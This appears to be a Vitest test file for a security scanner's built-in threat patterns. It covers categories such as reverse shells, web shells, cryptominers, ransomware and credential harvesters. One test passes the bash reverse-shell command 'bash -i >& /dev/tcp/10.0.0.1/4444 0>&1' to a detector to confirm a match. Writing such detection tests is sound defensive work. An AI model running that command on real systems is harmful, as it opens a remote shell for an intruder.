import { describe, it, expect } from 'vitest';
import { BUILTIN_THREAT_PATTERNS } from './threat-patterns.js';

describe('BUILTIN_THREAT_PATTERNS', () => {
  it('has at least 15 patterns', () => {
    expect(BUILTIN_THREAT_PATTERNS.length).toBeGreaterThanOrEqual(15);
  });

  it('every pattern has required fields', () => {
    for (const p of BUILTIN_THREAT_PATTERNS) {
      expect(p.id).toBeTruthy();
      expect(p.name).toBeTruthy();
      expect(p.category).toBeTruthy();
      expect(p.description).toBeTruthy();
      expect(p.killChainStage).toBeTruthy();
      expect(p.indicators.length).toBeGreaterThan(0);
      expect(p.intentWeight).toBeGreaterThan(0);
      expect(p.intentWeight).toBeLessThanOrEqual(1);
      expect(p.version).toBeTruthy();
    }
  });

  it('has unique IDs', () => {
    const ids = BUILTIN_THREAT_PATTERNS.map((p) => p.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('all indicators are RegExp instances', () => {
    for (const p of BUILTIN_THREAT_PATTERNS) {
      for (const ind of p.indicators) {
        expect(ind).toBeInstanceOf(RegExp);
      }
    }
  });

  it('covers reverse_shell category', () => {
    const shells = BUILTIN_THREAT_PATTERNS.filter((p) => p.category === 'reverse_shell');
    expect(shells.length).toBeGreaterThanOrEqual(2);
  });

  it('covers web_shell category', () => {
    const shells = BUILTIN_THREAT_PATTERNS.filter((p) => p.category === 'web_shell');
    expect(shells.length).toBeGreaterThanOrEqual(1);
  });

  it('covers cryptominer category', () => {
    const miners = BUILTIN_THREAT_PATTERNS.filter((p) => p.category === 'cryptominer');
    expect(miners.length).toBeGreaterThanOrEqual(1);
  });

  it('covers ransomware category', () => {
    const ransom = BUILTIN_THREAT_PATTERNS.filter((p) => p.category === 'ransomware');
    expect(ransom.length).toBeGreaterThanOrEqual(1);
  });

  it('covers credential_harvester category', () => {
    const harvesters = BUILTIN_THREAT_PATTERNS.filter((p) => p.category === 'credential_harvester');
    expect(harvesters.length).toBeGreaterThanOrEqual(1);
  });

  it('covers supply_chain category', () => {
    const supply = BUILTIN_THREAT_PATTERNS.filter((p) => p.category === 'supply_chain');
    expect(supply.length).toBeGreaterThanOrEqual(1);
  });

  it('co-occurrence references are valid pattern IDs', () => {
    const ids = new Set(BUILTIN_THREAT_PATTERNS.map((p) => p.id));
    for (const p of BUILTIN_THREAT_PATTERNS) {
      if (p.coOccurrenceWith) {
        for (const ref of p.coOccurrenceWith) {
          expect(ids.has(ref)).toBe(true);
        }
      }
    }
  });

  it('reverse shell patterns match real payloads', () => {
    const bashShell = BUILTIN_THREAT_PATTERNS.find((p) => p.id === 'threat-revshell-bash')!;
    expect(bashShell.indicators.some((i) => i.test('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))).toBe(
      true
    );
  });

  it('cryptominer patterns match stratum URLs', () => {
    const miner = BUILTIN_THREAT_PATTERNS.find((p) => p.id === 'threat-miner-stratum')!;
    expect(miner.indicators.some((i) => i.test('stratum+tcp://pool.example.com:3333'))).toBe(true);
  });

  it('ransomware patterns match encryption loops', () => {
    const ransom = BUILTIN_THREAT_PATTERNS.find((p) => p.id === 'threat-ransom-encrypt')!;
    expect(ransom.indicators.some((i) => i.test('.encrypted'))).toBe(true);
  });

  it('patterns have valid kill chain stages', () => {
    const validStages = new Set([
      'reconnaissance',
      'weaponization',
      'delivery',
      'exploitation',
      'installation',
      'command_and_control',
      'actions_on_objectives',
    ]);
    for (const p of BUILTIN_THREAT_PATTERNS) {
      expect(validStages.has(p.killChainStage)).toBe(true);
    }
  });
});
